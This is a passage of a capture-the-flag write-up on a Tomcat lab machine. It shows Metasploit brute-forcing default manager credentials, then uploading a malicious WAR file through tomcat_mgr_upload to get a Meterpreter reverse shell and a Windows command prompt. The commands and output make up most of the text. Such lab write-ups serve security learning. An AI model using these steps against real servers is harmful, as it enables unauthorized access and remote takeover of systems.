[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
<br><br>

#### Hurray! we have found a default username and password for the apache tomcat server. It is tomcat:s3cret. Using this default credentials we can upload a malicious war file into manager folder and get access to a remote shell. For doing it we have a module in msfconsole which is option no 6 in above search. By using it i have gained shell and accessed the flags folder where both the root and user flags are in the same file as shown below. <br><br>

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > use 6
[*] Using configured payload java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.95      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying vQKXXYycI6Gy8k2DTn9bzqr7nE...
[*] Executing vQKXXYycI6Gy8k2DTn9bzqr7nE...
[*] Undeploying vQKXXYycI6Gy8k2DTn9bzqr7nE ...
[*] Sending stage (58033 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.95:49192) at 2021-05-25 14:21:28 +0530

meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```
<br><br>

#### Thats it folks! Thank you for reading. :)
